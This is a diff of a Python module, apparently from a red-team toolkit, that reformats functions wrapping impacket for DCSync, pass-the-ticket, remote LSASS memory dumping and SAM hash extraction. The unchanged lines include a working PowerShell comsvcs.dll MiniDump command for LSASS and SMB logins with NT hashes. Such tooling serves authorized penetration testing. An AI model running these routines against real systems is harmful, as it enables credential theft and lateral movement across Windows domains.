@@ -40,6 +40,7 @@ CLI_TIMEOUT = 300
 
 # Internal helpers
 
+
 def _normalize_creds(creds: dict[str, str] | None) -> dict[str, str]:
     """Return a dict with guaranteed keys: user, password, domain, nthash."""
     defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
@@ -61,7 +62,11 @@ def _run_cli(cmd: list[str] | tuple[str, ...], timeout: int = CLI_TIMEOUT) -> st
         return "[!] Unsafe CLI command rejected: an argv sequence is required"
     try:
         result = subprocess.run(
-            list(cmd), shell=False, capture_output=True, text=True, timeout=timeout,
+            list(cmd),
+            shell=False,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
         )
         return (result.stdout + result.stderr).strip()
     except subprocess.TimeoutExpired:
@@ -85,6 +90,7 @@ def _impacket_auth_string(creds: dict[str, str]) -> str:
 
 
 # DCSync
+
 
 def dcsync(target: str, creds: dict[str, str] | None = None) -> str:
     """Perform a DCSync attack via impacket's ``secretsdump``.
@@ -119,6 +125,7 @@ def dcsync(target: str, creds: dict[str, str] | None = None) -> str:
 
         class _Options:
             """Minimal namespace for DumpSecrets."""
+
             def __init__(self) -> None:
                 self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}"
                 self.dc_ip = target
@@ -180,6 +187,7 @@ def dcsync(target: str, creds: dict[str, str] | None = None) -> str:
 
 # Pass-the-Hash
 
+
 def pass_the_hash(target: str, credential_handle: str = "") -> str:
     """Fail closed until a target-scoped NT-hash credential adapter exists."""
 
@@ -189,8 +197,8 @@ def pass_the_hash(target: str, credential_handle: str = "") -> str:
 
 # Pass-the-Ticket
 
-def pass_the_ticket(target: str, ticket_file: str,
-                    command: str = "whoami") -> str:
+
+def pass_the_ticket(target: str, ticket_file: str, command: str = "whoami") -> str:
     """Execute a command using a Kerberos ticket (Pass-the-Ticket).
 
     Sets ``KRB5CCNAME`` to the provided ``.ccache`` file and uses
@@ -254,6 +262,7 @@ def pass_the_ticket(target: str, ticket_file: str,
 
 # LSASS dump
 
+
 def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
     """Remotely dump LSASS process memory to extract credentials.
 
@@ -287,8 +296,7 @@ def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
         smb = SMBConnection(target, target, sess_port=445, timeout=30)
 
         if creds["nthash"]:
-            smb.login(creds["user"], "", creds["domain"],
-                      lmhash="", nthash=creds["nthash"])
+            smb.login(creds["user"], "", creds["domain"], lmhash="", nthash=creds["nthash"])
         else:
             smb.login(creds["user"], creds["password"], creds["domain"])
 
@@ -299,7 +307,7 @@ def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
             'powershell -c "'
             "$p = Get-Process lsass; "
             "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
-            f'MiniDump $p.Id C:\\Windows\\Temp\\{dump_filename} full'
+            f"MiniDump $p.Id C:\\Windows\\Temp\\{dump_filename} full"
             '"'
         )
 
@@ -307,7 +315,8 @@ def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
             from impacket.examples.wmiexec import WMIEXEC  # type: ignore[import-untyped]
 
             executer = WMIEXEC(
-                dump_cmd, username=creds["user"],
+                dump_cmd,
+                username=creds["user"],
                 password=creds["password"],
                 domain=creds["domain"],
                 hashes=f":{creds['nthash']}" if creds["nthash"] else "",
@@ -382,6 +391,7 @@ def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
 
 # SAM dump
 
+
 def sam_dump(target: str, creds: dict[str, str] | None = None) -> str:
     """Remotely dump the SAM database (local account hashes).
 
@@ -414,8 +424,13 @@ def sam_dump(target: str, creds: dict[str, str] | None = None) -> str:
 
         class _Options:
             """Minimal namespace for DumpSecrets (SAM only)."""
+
             def __init__(self) -> None:
-                self.target = f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}" if creds["domain"] else f"{creds['user']}:{creds['password']}@{target}"
+                self.target = (
+                    f"{creds['domain']}/{creds['user']}:{creds['password']}@{target}"
+                    if creds["domain"]
+                    else f"{creds['user']}:{creds['password']}@{target}"
+                )
                 self.dc_ip = None
                 self.target_ip = target
                 self.just_dc = False
